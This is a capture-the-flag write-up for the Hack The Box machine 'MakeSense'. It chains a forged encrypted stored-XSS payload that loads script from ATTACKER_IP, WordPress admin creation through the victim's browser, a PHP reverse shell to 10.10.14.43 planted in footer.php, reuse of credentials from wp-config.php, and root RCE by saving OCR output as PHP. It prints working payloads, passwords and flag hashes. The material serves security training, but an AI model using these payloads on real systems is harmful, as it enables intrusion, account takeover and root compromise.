# Hack The Box - MakeSense Writeup

![Linux](https://img.shields.io/badge/OS-Linux-blue)
![Difficulty](https://img.shields.io/badge/Difficulty-Medium-orange)
![Category](https://img.shields.io/badge/Category-Web%20%2F%20Privilege%20Escalation-red)

> **Active-machine material - private only. Do not publish until MakeSense has retired.**

## Machine Information

| Field | Value |
|---|---|
| Platform | Hack The Box |
| Machine | MakeSense |
| OS | Linux |
| Difficulty | Medium |
| Main Techniques | WordPress Enumeration, Client-side Crypto Abuse, Stored XSS, WordPress Admin Takeover, PHP Reverse Shell, Credential Reuse, Internal Service Abuse, OCR-to-PHP RCE |
| Initial Foothold | Stored XSS leading to WordPress administrator account creation |
| User | Credentials reused from `wp-config.php` |
| Root | Internal OCR service running as root, saving executable PHP files |

---

## Summary

MakeSense is a Linux machine based around a custom WordPress theme and an internal OCR application.

The external web application exposed a WordPress site using a custom theme called `WebAgency`. During enumeration, several JavaScript files related to audio transcription and AI processing were discovered. These files revealed a hardcoded encryption key used to protect voice transcription results.

By reimplementing the client-side encryption logic, it was possible to forge a valid encrypted payload containing a stored XSS. When the admin/bot processed the malicious voice result, the XSS executed in the administrator's browser. Instead of stealing cookies, which were protected by `HttpOnly`, the XSS used the admin's authenticated session to create a new WordPress administrator account.

After gaining WordPress admin access, the active theme was modified to obtain a reverse shell as `www-data`. From there, credentials were recovered from `wp-config.php` and reused to SSH as the Linux user `walter`.

Privilege escalation was achieved by discovering an internal OCR service running as root on `127.0.0.1:8001`. The service accepted Basic Auth using `walter`'s credentials, allowed OCR output to be saved as arbitrary filenames, and executed saved `.php` files. By generating an image containing valid PHP code, submitting it to the OCR engine, and saving the recognized output as a `.php` file, root command execution was obtained.

---

## Reconnaissance

### Nmap Scan

Initial scan:

```bash
nmap -sC -sV -p- --min-rate 5000 makesense.htb
```

Relevant ports:

```text
22/tcp   open   ssh
80/tcp   filtered / later reachable
443/tcp  open   https
8001/tcp filtered externally
```

The main web application was available over HTTPS:

```text
https://makesense.htb
```

During testing, there were several timeout issues even though the ports were open. The fix was to lower the VPN interface MTU:

```bash
sudo ip link set dev tun0 mtu 1200
```

After that, the website loaded correctly.

---

## Web Enumeration

### WordPress Identification

WPScan confirmed that the target was running WordPress:

```bash
wpscan --url https://makesense.htb --disable-tls-checks --force
```

Important findings:

```text
WordPress detected
Theme: WebAgency
XML-RPC enabled
Upload directory listing enabled
```

The active theme was a custom theme:

```text
WebAgency
```

Custom themes are often more interesting than WordPress core itself because they may contain challenge-specific logic.

---

### Uploads Directory

The uploads directory was browsable:

```text
https://makesense.htb/wp-content/uploads/
```

A suspicious audio file was found:

```text
voice-message.wav
```

This suggested that the voice/audio functionality was part of the intended exploitation path.

---

### AI/Whisper Hints

A publicly accessible `.gitignore` file revealed several AI-related paths and model references:

```bash
curl -k https://makesense.htb/.gitignore
```

Interesting entries included:

```text
wp-content/ai-models/models/
.cache/huggingface/
whisper
distilbart
transformers.js
```

This indicated that the application was not only a WordPress site, but also included AI/audio processing functionality.

---

## JavaScript Analysis

The home page loaded JavaScript files from the custom theme:

```bash
curl -k -s https://makesense.htb/ -o home.html
grep -oE 'src="[^"]+\.js[^"]*"' home.html
```

Interesting files:

```text
/wp-content/themes/webagency/assets/js/whisper/whisper-wrapper.js
/wp-content/themes/webagency/assets/js/main.js
```

They were downloaded locally:

```bash
wget --no-check-certificate "https://makesense.htb/wp-content/themes/webagency/assets/js/whisper/whisper-wrapper.js?ver=1.0" -O whisper-wrapper.js

wget --no-check-certificate "https://makesense.htb/wp-content/themes/webagency/assets/js/main.js?ver=1.0" -O main.js
```

---

### Understanding the Voice Workflow

The JavaScript showed that the application used two AJAX actions:

```text
save_voice_raw
save_voice_results
```

The logic was:

```text
1. Upload the raw audio file.
2. The browser transcribes and summarizes it.
3. The result is encrypted client-side.
4. The encrypted result is sent back to WordPress.
5. An admin/bot later reviews the result.
```

The payload structure looked like:

```json
{
  "transcription": "...",
  "summary": "..."
}
```

---

### Hardcoded Encryption Key

Inside `whisper-wrapper.js`, the encryption key was hardcoded:

```js
const ENCRYPTION_KEY = 'bLs6z8iv3gWpsvyeabFosDjb4YQe7jdU13rI';
```

The encryption logic used AES-GCM with a SHA-256 derived key.

Because the key was exposed client-side, the encryption did not provide real protection. Anyone could reproduce the encryption process and send forged encrypted results to the backend.

---

### XSS Hint

The JavaScript also contained a very strong hint:

```js
// Map spoken words to their symbol equivalents for XSS injection
```

The mapping converted words like:

```text
open bracket  -> <
close bracket -> >
slash         -> /
quote         -> '
double quote  -> "
dot           -> .
```

This strongly suggested that the intended vulnerability was a stored XSS through the voice transcription result.

---

## Exploiting the Stored XSS

### Getting the WordPress AJAX Nonce

The WordPress AJAX nonce was extracted from the homepage:

```bash
curl -k -s https://makesense.htb/ -o home.html
NONCE=$(grep -oP '"nonce":"\K[^"]+' home.html)
echo $NONCE
```

Example:

```text
f3142630f4
```

---

### Creating a Voice Submission

A valid voice submission was first created using the `save_voice_raw` action:

```bash
curl -k -s -X POST https://makesense.htb/wp-admin/admin-ajax.php \
-F "action=save_voice_raw" \
-F "nonce=$NONCE" \
-F "voice_recording=@voice-message.wav;type=audio/wav"
```

Example response:

```json
{
  "success": true,
  "data": {
    "message": "Audio saved, processing started.",
    "post_id": 74
  }
}
```

The important value was:

```text
post_id=74
```

---

### Forging an Encrypted XSS Payload

Because the encryption key was exposed, a malicious transcription could be encrypted locally.

The payload used was a stored XSS that loaded an external JavaScript file from the attacker machine:

```html
<img src=x onerror="s=document.createElement('script');s.src='http://ATTACKER_IP:8000/x.js';document.body.appendChild(s)">
```

The malicious encrypted result was then submitted to:

```text
save_voice_results
```

---

### XSS Goal

At first, cookie exfiltration was tested, but only a low-value cookie was recovered:

```text
wp-settings-time-3=...
```

The real WordPress session cookie was likely protected with `HttpOnly`, so JavaScript could not read it.

Instead of stealing the cookie, the XSS was used to make authenticated requests from the admin/bot browser.

This is the key idea:

```text
The XSS cannot read the admin cookie,
but the browser automatically sends it with same-origin requests.
```

So the admin browser was abused as an authenticated proxy.

---

### Creating a WordPress Administrator

The XSS-loaded JavaScript did the following:

```text
1. Request /wp-admin/user-new.php using the admin session.
2. Extract the WordPress nonce from the page.
3. Submit the user creation form.
4. Create a new user with role=administrator.
```

The account created was:

```text
Username: ridoky
Password: Password123!A
Role: administrator
```

When the bot/admin visited the malicious stored result, the callback logs confirmed execution:

```text
GET /x.js
stage=start
stage=user_new_loaded
stage=posted&status=200&created=true&u=ridoky&p=Password123!A
```

At this point, WordPress administrator access was obtained.

---

## WordPress Admin to Reverse Shell

After logging into WordPress as the new administrator:

```text
https://makesense.htb/wp-login.php
```

Credentials:

```text
ridoky : Password123!A
```

The Theme File Editor was accessible.

The active theme was:

```text
WebAgency
```

The file `footer.php` was modified because it is loaded on most WordPress pages.

A PHP reverse shell was added:

```php
<?php
$sock = fsockopen("10.10.14.43", 4444);
$proc = proc_open("/bin/bash -i", array(0 => $sock, 1 => $sock, 2 => $sock), $pipes);
?>
```

Listener on Kali:

```bash
nc -lvnp 4444
```

After visiting the site, a shell was received:

```text
www-data@makesense:/var/www/html$
```

---

## Lateral Movement to Walter

### Reading WordPress Configuration

From the reverse shell:

```bash
cat /var/www/html/wp-config.php
```

The site used SQLite:

```php
define( 'DB_DIR', __DIR__ . '/wp-content/database/' );
define( 'DB_FILE', '.ht.sqlite' );
```

However, the config also contained dummy MySQL credentials:

```php
define( 'DB_USER', 'walter' );
define( 'DB_PASSWORD', 'JbhHDAEgXvri3!' );
```

Even though they were not used for MySQL, the username was interesting.

The `/home` directory confirmed the existence of the Linux user:

```bash
ls /home
```

Output:

```text
admin
walter
```

The credentials were reused for SSH:

```bash
ssh walter@makesense.htb
```

Password:

```text
JbhHDAEgXvri3!
```

This gave access as `walter`.

---

### User Flag

```bash
cat ~/user.txt
```

Output:

```text
6ba70a7fdb4d80410dfac9ccb15258e3
```

---

## Privilege Escalation

### Initial Enumeration

The user `walter` had no sudo privileges:

```bash
sudo -l
```

Output:

```text
Sorry, user walter may not run sudo on makesense.
```

SUID binaries were checked:

```bash
find / -perm -4000 -type f 2>/dev/null
```

Nothing directly useful was found.

Capabilities were checked:

```bash
getcap -r / 2>/dev/null
```

Again, nothing immediately exploitable.

Cron jobs were also checked:

```bash
cat /etc/crontab
ls -la /etc/cron.d
```

No direct privesc path was found there.

---

### Discovering an Internal Root Service

Listening services revealed an internal port:

```bash
ss -tunlp
```

Interesting service:

```text
127.0.0.1:8001
```

Processes revealed what was running on that port:

```bash
ps auxww | grep -iE "8001|php|ocr|chrome|admin" | grep -v grep
```

Output:

```text
root  php -S 127.0.0.1:8001 -t /root/ocr4/
```

This was a major finding:

```text
A PHP development server was running locally.
It served files from /root/ocr4/.
It was running as root.
```

If the application allowed writing executable PHP files, it could lead to root RCE.

---

## Accessing the OCR Application

Direct request:

```bash
curl -i http://127.0.0.1:8001/
```

Response:

```text
401 Unauthorized
WWW-Authenticate: Basic realm="OCR Protected"
```

The service used Basic Auth.

The `walter` credentials worked:

```bash
curl -i -u walter:'JbhHDAEgXvri3!' http://127.0.0.1:8001/
```

Response:

```text
HTTP/1.1 200 OK
```

To access it from the Kali browser, SSH port forwarding was used:

```bash
ssh -L 8001:127.0.0.1:8001 walter@makesense.htb
```

Then:

```text
http://127.0.0.1:8001/
```

Basic Auth:

```text
walter : JbhHDAEgXvri3!
```

---

## Understanding the OCR Application

The OCR app allowed the user to draw text on a canvas and recognize it.

The workflow was:

```text
1. Draw text on the canvas.
2. Submit the image.
3. Server performs OCR.
4. Server displays recognized text.
5. User can save the recognized text as a file.
```

After recognition, the page showed:

```text
Recognized
Save as
```

Saving a file such as:

```text
ridoky.txt
```

created:

```text
saved/ridoky.txt
```

It was accessible through HTTP:

```bash
curl -i -u walter:'JbhHDAEgXvri3!' http://127.0.0.1:8001/saved/ridoky.txt
```

Then a `.php` filename was tested:

```text
test.php
```

The file was accessible as:

```bash
curl -i -u walter:'JbhHDAEgXvri3!' http://127.0.0.1:8001/saved/test.php
```

This showed that `.php` files inside `saved/` were interpreted by the PHP server.

Since the PHP server was running as root, writing valid PHP code into `saved/` would result in root command execution.

---

## Capturing the Save Request

Using Burp, the Save request was captured:

```http
POST / HTTP/1.1
Host: ocr.local:8001
Content-Type: application/x-www-form-urlencoded

ocr_id=ocr_6a4bd26a6956b3.82843920&filename=hhhh.php&save_output=
```

This showed that the application did not save arbitrary text sent by the client.

Instead, it saved the OCR result referenced by `ocr_id`.

The internal logic was:

```text
Recognize image
-> server creates OCR result
-> server assigns ocr_id
-> Save request sends ocr_id + filename
-> server writes recognized text to saved/<filename>
```

Therefore, to exploit the application, the OCR output itself had to be valid PHP.

---

## Generating Valid PHP Through OCR

Drawing PHP manually was unreliable. The OCR returned broken text like:

```text
TX]
FAT
Te<) 7
```

So a clean image was generated locally using Python and Pillow.

The first attempt was a dynamic webshell:

```php
<?php system($_GET["x"]); ?>
```

However, the OCR recognized it as:

```php
<?php system($ GET["x"]); ?>
```

The inserted space between `$` and `GET` broke the PHP syntax.

To avoid problematic characters, a simpler fixed command was used:

```php
<?php system('id');?>
```

This payload was much easier for OCR to recognize.

---

### Generating the `id` Payload Image

```bash
python3 - << 'PY'
from PIL import Image, ImageDraw, ImageFont

text = "<?php system('id');?>"

img = Image.new("RGB", (1200, 220), "white")
draw = ImageDraw.Draw(img)

font = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSansMono-Bold.ttf", 72)
draw.text((30, 70), text, fill="black", font=font)

img.save("id_payload.png")
print("saved id_payload.png")
PY
```

Submit the image:

```bash
B64=$(base64 -w0 id_payload.png)

curl -i -u walter:'JbhHDAEgXvri3!' \
-c ocr.cookies -b ocr.cookies \
-X POST http://127.0.0.1:8001/ \
--data-urlencode "canvas_image=data:image/png;base64,$B64" \
-o id_response.html
```

Check the recognized text:

```bash
grep -A5 -B5 'output-text' id_response.html
```

The OCR correctly recognized:

```php
<?php system('id');?>
```

Extract the `ocr_id`:

```bash
OCRID=$(grep -oP 'name="ocr_id" value="\K[^"]+' id_response.html)
echo $OCRID
```

Save it as a PHP file:

```bash
curl -i -u walter:'JbhHDAEgXvri3!' \
-c ocr.cookies -b ocr.cookies \
-X POST http://127.0.0.1:8001/ \
-d "ocr_id=$OCRID" \
-d "filename=id.php" \
-d "save_output="
```

Execute it:

```bash
curl -i -u walter:'JbhHDAEgXvri3!' \
http://127.0.0.1:8001/saved/id.php
```

Output:

```text
uid=0(root) gid=0(root) groups=0(root)
```

This confirmed root RCE.

---

## Reading the Root Flag

A second payload image was generated to read `/root/root.txt`.

```bash
python3 - << 'PY'
from PIL import Image, ImageDraw, ImageFont

text = "<?php system('cat /root/root.txt');?>"

img = Image.new("RGB", (1900, 240), "white")
draw = ImageDraw.Draw(img)

font = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSansMono-Bold.ttf", 64)
draw.text((30, 75), text, fill="black", font=font)

img.save("rootflag_payload.png")
print("saved rootflag_payload.png")
PY
```

Submit it to the OCR app:

```bash
B64=$(base64 -w0 rootflag_payload.png)

curl -i -u walter:'JbhHDAEgXvri3!' \
-c ocr.cookies -b ocr.cookies \
-X POST http://127.0.0.1:8001/ \
--data-urlencode "canvas_image=data:image/png;base64,$B64" \
-o rootflag_response.html
```

Verify the OCR output:

```bash
grep -A5 -B5 'output-text' rootflag_response.html
```

Extract the `ocr_id`:

```bash
OCRID=$(grep -oP 'name="ocr_id" value="\K[^"]+' rootflag_response.html)
echo $OCRID
```

Save the OCR result as PHP:

```bash
curl -i -u walter:'JbhHDAEgXvri3!' \
-c ocr.cookies -b ocr.cookies \
-X POST http://127.0.0.1:8001/ \
-d "ocr_id=$OCRID" \
-d "filename=rootflag.php" \
-d "save_output="
```

Execute the PHP file:

```bash
curl -s -u walter:'JbhHDAEgXvri3!' \
http://127.0.0.1:8001/saved/rootflag.php
```

Output:

```text
6360ab57fa5b00e9a68ee1c48d115bce
```

---

## Root Flag

```text
6360ab57fa5b00e9a68ee1c48d115bce
```

---

## Attack Chain

```text
WordPress WebAgency custom theme
-> AI/Whisper JavaScript analysis
-> hardcoded client-side encryption key
-> forged encrypted voice result
-> stored XSS
-> XSS executed by admin/bot
-> authenticated admin action through victim browser
-> WordPress administrator account created
-> Theme File Editor
-> PHP reverse shell
-> www-data shell
-> wp-config.php credentials
-> SSH as walter
-> internal OCR service on 127.0.0.1:8001
-> Basic Auth with walter credentials
-> PHP server running as root
-> OCR output saved as .php
-> PHP executed as root
-> root flag
```

---

## Key Lessons

### 1. Client-side secrets are not secrets

The encryption key was stored in a public JavaScript file. This allowed the encrypted voice result to be forged.

### 2. HttpOnly does not stop XSS impact

The admin cookie could not be read with JavaScript, but the browser still sent it automatically with same-origin requests. The XSS was used to perform authenticated actions instead of stealing the cookie.

### 3. Credential reuse is dangerous

Credentials found in WordPress configuration were reused for SSH and for the internal OCR Basic Auth.

### 4. Internal services matter

The root compromise came from a localhost-only service that was not externally exposed.

### 5. Never run untrusted processing as root

The OCR application processed user-controlled input and saved files while running as root. This turned a file-save feature into full root RCE.

### 6. File extension filtering matters

Allowing OCR output to be saved as `.php` in a web-accessible directory allowed server-side code execution.

---

## Vulnerabilities Used

No public CVE was required for this machine.

The exploitation relied on a chain of application and configuration weaknesses:

```text
1. Hardcoded client-side encryption key.
2. Stored XSS through forged encrypted voice transcription results.
3. WordPress admin action abuse via XSS.
4. WordPress Theme File Editor abused for PHP code execution.
5. Credential reuse from wp-config.php.
6. Internal OCR service exposed on localhost.
7. OCR service running as root.
8. Saving executable .php files from OCR output.
```
